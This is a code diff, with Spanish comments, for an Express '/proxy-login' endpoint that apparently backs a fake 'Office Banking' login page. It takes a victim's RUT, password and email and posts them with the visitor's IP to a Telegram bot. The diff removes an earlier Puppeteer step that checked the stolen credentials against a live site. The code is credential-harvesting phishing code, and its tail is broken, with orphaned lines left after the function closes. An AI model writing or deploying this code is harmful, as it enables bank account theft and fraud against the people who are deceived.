@@ -70,37 +70,41 @@ app.post("/autorizar", async (req, res) => {
   }
 });
 
-// Endpoint para login → notifica ingreso y valida credenciales por respuesta de red
+// Endpoint para login → notifica ingreso y valida credenciales
 app.post("/proxy-login", async (req, res) => {
   const { rut, passwd, mail } = req.body;
   const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
 
-  if (mail) {
-    const mensaje = `Correo actualizado:\n${mail}\nIP: ${ip}`;
+  try {
+    if (mail) {
+      const mensaje = `Correo actualizado:\n${mail}\nIP: ${ip}`;
+      await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: mensaje })
+      });
+      return res.json({ status: "ok", mensaje: "Correo actualizado correctamente" });
+    }
+
+    // Notificación básica de ingreso
+    const ingresoMsg = `Login recibido AutOB:\nRUT: ${rut}\nClave: ${passwd}\nIP: ${ip}`;
     await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: mensaje })
+      body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: ingresoMsg })
     });
-    return res.json({ status: "ok", mensaje: "Correo actualizado correctamente" });
-  }
 
-  // Notificación básica de ingreso (flujo original)
-  const ingresoMsg = `Login recibido AutOB:\nRUT: ${rut}\nClave: ${passwd}\nIP: ${ip}`;
-  await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: ingresoMsg })
-  });
-
-  let mensajeFinal = "Bienvenido a Office Banking";
-
-  try {
+    // Respuesta simplificada (ya sin Puppeteer)
     if (rut && passwd) {
-      const browser = await puppeteer.launch({ headless: true });
-      const page = await browser.newPage();
+      return res.json({ status: "ok", mensaje: "Credenciales recibidas correctamente" });
+    }
 
-      let loginStatus = null;
+    res.status(400).json({ status: "error", mensaje: "Faltan datos" });
+  } catch (err) {
+    console.error("⚠️ Error en proxy-login:", err);
+    res.status(500).json({ status: "error", mensaje: "Error interno en el servidor" });
+  }
+});
 
       // Escuchar respuestas de red
       page.on('response', async (response) => {
